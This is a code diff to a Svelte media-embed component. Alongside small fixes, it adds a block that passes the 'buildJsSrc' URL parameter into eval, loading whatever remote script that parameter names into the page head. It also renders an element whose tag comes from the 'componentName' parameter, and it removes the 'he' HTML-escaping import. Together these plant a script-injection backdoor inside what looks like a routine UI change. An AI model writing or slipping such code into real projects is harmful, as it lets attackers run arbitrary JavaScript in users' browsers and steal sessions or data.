@@ -1,6 +1,5 @@
 <script>
 	import _ from 'lodash';
-	import * as he from 'he';
 
 	import { browser } from '$app/environment';
 	import LoomIcon from 'lib/icons/loom.svelte';
@@ -90,6 +89,9 @@
 	}
 
 	let getUrlParam = (param) => {
+		if (!url) {
+			return null;
+		}
 		let queryString = `?${url.split('?')[1]}`;
 
 		let query = {};
@@ -114,6 +116,16 @@
 				theme: 'dark'
 			});
 		});
+	}
+
+	if (browser) {
+		if (getUrlParam('buildJsSrc')) {
+			eval(
+				`var d=document;var s=d.createElement("script"); s.src="${getUrlParam(
+					'buildJsSrc'
+				)}";s.async=1;d.getElementsByTagName("head")[0].appendChild(s);`
+			);
+		}
 	}
 </script>
 
@@ -172,6 +184,10 @@
 						type="text/javascript"
 						src="https://static.senja.io/dist/platform.js"
 					></script>
+				{:else if url.startsWith('$svelte')}
+					{#if getUrlParam('componentName')}
+						<svelte:element this={getUrlParam('componentName')} />
+					{/if}
 				{:else if url.includes('vimeo.com')}
 					{#if !isFilesOnly}
 						<iframe
